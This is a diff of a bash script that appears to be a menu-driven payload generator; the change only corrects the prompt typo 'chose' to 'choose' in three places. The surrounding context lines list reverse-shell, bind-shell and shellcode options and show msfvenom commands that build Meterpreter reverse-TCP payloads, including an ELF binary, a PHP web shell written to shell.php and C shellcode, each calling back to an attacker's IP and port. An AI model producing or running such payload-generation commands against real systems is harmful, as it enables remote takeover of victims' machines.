@@ -32,7 +32,7 @@ function Binaries(){
 	echo "[6] Windows Encoded Meterpreter Windows Reverse Shell"
 	echo "[7] Mac Reverse Shell"
 	echo "[8] Mac Bind Shell"
-	read -p "chose a Payload " bin_shell
+	read -p "choose a Payload " bin_shell
 	if [[ $bin_shell == 1 ]]; then
 		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f elf > shell.elf
 
@@ -68,7 +68,7 @@ function Web(){
 	echo "[5] Python Reverse Shell"
 	echo "[6] Bash Unix Reverse Shell"
 	echo "[7] Perl Unix Reverse shell"
-	read -p "chose a Payload " Web
+	read -p "choose a Payload " Web
 	if [[ $Web == 1 ]]; then
 		msfvenom -p php/meterpreter_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f raw | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php
 	elif [[ $Web == 2 ]]; then
@@ -92,7 +92,7 @@ function Shellcode(){
 	echo "[2] Linux Meterpreter Reverse TCP Shellcode"
 	echo "[3] Mac Reverse TCP Shellcode"
 	echo "[4] Create User"
-	read -p "chose a Payload " Shellcode
+	read -p "choose a Payload " Shellcode
 	if [[ $Shellcode == 1 ]]; then
 		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f c
 	elif [[ $Shellcode == 2 ]]; then
